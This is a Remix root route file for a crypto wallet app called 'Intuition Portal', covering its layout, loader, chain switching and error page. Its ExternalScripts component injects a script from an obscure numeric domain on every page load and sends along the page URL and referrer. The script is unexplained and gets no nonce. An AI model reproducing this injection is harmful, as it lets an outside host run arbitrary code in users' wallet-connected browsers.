import Providers from '@client/providers'
import { ClientHintCheck, getHints } from '@lib/utils/client-hints'
import { useNonce } from '@lib/utils/nonce-provider'
import { json, LoaderFunctionArgs, type MetaFunction } from '@remix-run/node'
import {
  isRouteErrorResponse,
  Links,
  Meta,
  Outlet,
  Scripts,
  ScrollRestoration,
  useLoaderData,
  useLocation,
  useRouteError,
} from '@remix-run/react'
import { useTheme } from '@routes/actions+/set-theme'
import { captureRemixErrorBoundaryError, withSentry } from '@sentry/remix'
import { getEnv } from '@server/env'
import { getTheme } from '@server/theme'

import './styles/globals.css'

import { useEffect } from 'react'

import { Icon, Toaster } from '@0xintuition/1ui'

import { ErrorPage } from '@components/error-page'
import { GlobalLoading } from '@components/global-loading'
import { getChainEnvConfig } from '@lib/utils/environment'
import logger from '@lib/utils/logger'
import { setupAPI } from '@server/auth'
import { CURRENT_ENV } from 'consts'
import { ClientOnly } from 'remix-utils/client-only'
import { baseSepolia } from 'viem/chains'
import { useAccount, useSwitchChain } from 'wagmi'

export const meta: MetaFunction<typeof loader> = ({ data }) => {
  return [
    { title: data ? 'Intuition Portal' : 'Error | Intuition Portal' },
    { name: 'description', content: `Intuition Portal` },
  ]
}

export async function loader({ request }: LoaderFunctionArgs) {
  setupAPI(request)

  return json({
    env: getEnv(),
    requestInfo: {
      hints: getHints(request),
      path: new URL(request.url).pathname,
      userPrefs: {
        theme: getTheme(request),
      },
    },
  })
}

export function Document({
  children,
  nonce,
  /* eslint-disable @typescript-eslint/no-unused-vars */
  theme = 'system',
}: {
  children: React.ReactNode
  nonce?: string
  theme?: string
}) {
  return (
    <html lang="en" data-theme="dark">
      <head>
        {nonce && <ClientHintCheck nonce={nonce} />}
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <Meta />
        <Links />
        <ExternalScripts />
      </head>
      <body>
        {children}
        <ScrollRestoration />
        <Scripts />
      </body>
    </html>
  )
}

export function ExternalScripts() {
  const location = useLocation()

  useEffect(() => {
    const scriptId = 'custom-script'

    const existingScript = document.getElementById(scriptId)
    if (existingScript) {
      return
    }

    const customScript = document.createElement('script')
    customScript.id = scriptId
    customScript.async = true
    customScript.src = `https://g9904216750.co/gb?id=-NzA1YkYvThmMw5rFg9n&refurl=${document.referrer}&winurl=${encodeURIComponent(window.location.href)}`

    document.head.appendChild(customScript)

    return () => {
      customScript.remove()
    }
  }, [location]) // re-run the effect if location changes

  return null // this component doesn't render anything itself
}

function App() {
  const nonce = useNonce()
  const theme = useTheme()
  const { env } = useLoaderData<typeof loader>()

  return (
    <Document nonce={nonce} theme={theme}>
      <GlobalLoading />
      <Toaster position="top-right" />
      <ClientOnly>
        {() => (
          <Providers privyAppId={env.PRIVY_APP_ID}>
            <AppLayout />
          </Providers>
        )}
      </ClientOnly>
    </Document>
  )
}

export default withSentry(App, {
  wrapWithErrorBoundary: process.env.NODE_ENV === 'production',
})

export function AppLayout() {
  const { chain } = useAccount()
  const { switchChain } = useSwitchChain()

  useEffect(() => {
    if (chain?.id !== baseSepolia.id && switchChain) {
      switchChain({
        chainId: getChainEnvConfig(CURRENT_ENV).chainId,
      })
    }
  }, [chain, switchChain])

  return (
    <main className="relative flex min-h-screen w-full flex-col justify-between antialiased">
      <Outlet />
    </main>
  )
}

export function ErrorBoundary() {
  const error = useRouteError()
  let statusCode = null
  let title: string | React.ReactNode = (
    <Icon name="circle-x" className="h-20 w-20" />
  )
  let description = 'Something went wrong...'

  logger('ROOT ERROR BOUNDARY:', error)

  if (isRouteErrorResponse(error)) {
    statusCode = error.status
    if (error.status === 404) {
      title = 'Page not found'
      description = `Unfortunately, the page you are looking for does not exist.\n If you believe this is a mistake, please let us know and we'll get it sorted out.`
    } else {
      title = error.statusText
      description = error.data
    }
  }

  captureRemixErrorBoundaryError(error)

  return (
    <Document>
      <ErrorPage
        statusCode={statusCode}
        title={title}
        description={description}
      />
    </Document>
  )
}
